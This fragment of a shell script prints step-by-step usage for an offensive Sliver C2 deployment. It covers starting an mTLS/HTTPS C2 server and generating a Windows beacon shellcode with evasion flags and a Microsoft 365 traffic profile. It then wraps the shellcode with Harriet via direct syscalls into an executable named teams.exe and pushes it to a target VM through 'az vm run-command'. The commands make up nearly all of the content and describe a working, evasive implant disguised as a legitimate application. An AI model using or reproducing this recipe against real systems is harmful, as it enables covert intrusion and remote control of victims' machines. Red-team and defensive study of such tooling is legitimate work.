...
echo -e "     ./start.sh                                ${CYAN}# auto: daemon, config, profile, armory, mTLS:8888${NC}"
echo -e "     ./start.sh --domain cdn.yourdomain.com    ${CYAN}# also start HTTPS:443${NC}"
echo ""
echo -e "  ${YELLOW}2. Generate shellcode (in sliver console):${NC}"
echo -e "     generate beacon --mtls YOUR_C2_IP:8888 --os windows --arch amd64 \\"
echo -e "       --format shellcode --evasion --c2profile microsoft365 \\"
echo -e "       --seconds 60 --jitter 30 --save /tmp/beacon.bin"
echo ""
echo -e "  ${YELLOW}3. Wrap with Harriet (in sliver console):${NC}"
echo -e "     harriet --shellcode /tmp/beacon.bin --method directsyscall \\"
echo -e "       --format exe --output /tmp/teams.exe"
echo ""
echo -e "  ${YELLOW}   Or steps 2+3 combined:${NC}"
echo -e "     ./gen-implant.sh --ip YOUR_C2_IP"
echo ""
echo -e "  ${YELLOW}4. Deploy to target:${NC}"
echo -e "     az vm run-command create --vm-name TARGET --resource-group RG ..."
echo -e "     ${CYAN}# Full guide: ATTACKPATH.md${NC}"
echo ""
